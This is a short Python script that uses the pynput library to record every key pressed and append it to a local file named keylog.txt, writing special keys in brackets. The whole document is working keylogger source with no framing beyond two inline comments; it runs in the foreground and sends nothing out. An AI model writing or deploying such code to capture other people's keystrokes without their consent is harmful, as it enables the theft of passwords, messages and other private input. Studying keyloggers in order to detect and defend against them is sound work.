from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as f:
        try:
            f.write(f"{key.char}") # This is the regular keys

        except AttributeError:
            f.write(f"[{key}]") # For special keys

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()